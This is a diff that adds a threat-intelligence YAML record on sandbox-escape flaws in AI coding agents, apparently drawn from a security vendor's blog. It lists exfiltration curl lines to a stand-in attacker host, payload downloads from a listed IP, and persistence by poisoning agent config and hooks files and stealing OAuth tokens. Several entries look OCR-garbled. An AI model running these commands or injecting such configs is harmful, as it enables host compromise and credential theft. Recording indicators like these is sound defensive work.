@@ -1,0 +1,71 @@
+title: 'The Race to Ship AI Tools Left Security Behind. Part 1: Sandbox Escape'
+description: Two distinct vulnerability families allow sandboxed attackers to execute
+  arbitrary code on the host system through improper filesystem isolation and unsafe
+  executable resolution.
+attribution: ''
+malware_families: []
+cves:
+- CVE-2026-25725
+ttps:
+  processes:
+  - cmd.exe
+  - wosiss.exe
+  - Gemd.exe
+  - node.exe
+  - python3
+  - sh
+  - ps
+  - curl
+  - nc
+  - calc.exe
+  command_lines:
+  - curl https://attacker.com/exfil?h=$(hostname)
+  - curl https://attacker.com/exfil?h=$(hostname) && id > /tmp/pwned
+  - curl o setcings.json http://3.251.237.0/setrings.json
+  - curl o where.exe http://3.251.237.0/where.exe
+  - ps aux
+  - kill -9 7
+  - gemini --sandbox
+  - cale.exe
+  - ~/bin/bash -c touch /hose/<user>>/poc.txt
+  powershell: []
+  scripts:
+  - Invoke-RestMethod -Method GET -Uri Suri -Headers SHeaders -ErrorAction Stop
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - Codex CLI -> hxxps://attacker[.]com/exfil:80
+  - nc -> 172.174.248.10:50616
+  - curl -> 3.251.237.0:80
+  file_activity:
+  - .claude/settings.json
+  - ./.codex/config.toml
+  - ./agents.md
+  - /home/<user>/.gemini/settings.json
+  - /tmp/who.txt
+  - /hose/<user>>/poc.txt
+  persistence:
+  - Configuration injection via hooks in .claude/settings.json
+  - Configuration file poisoning (.codex/config.toml)
+  - OAuth token theft (oauth_creds.json)
+  - notify command in ./.codex/config.toml
+  - malicious startup instructions in ./agents.md
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+  - 3.251.237.0
+  - 172.174.248.10
+  domains:
+  - attacker[.]com
+  urls:
+  - hxxps://attacker[.]com/exfil?h=$(hostname)
+authors:
+- Ilan Kalendarov
+- Ben Zamir
+- Elad Beber
+- Cymulate research team
+- Cymulate Research Labs
+reference: https://cymulate.com/blog/the-race-to-ship-ai-tools-left-security-behind-part-1-sandbox-escape
+date_of_publication: May 01, 2026
+file_creation_date: May 01, 2026
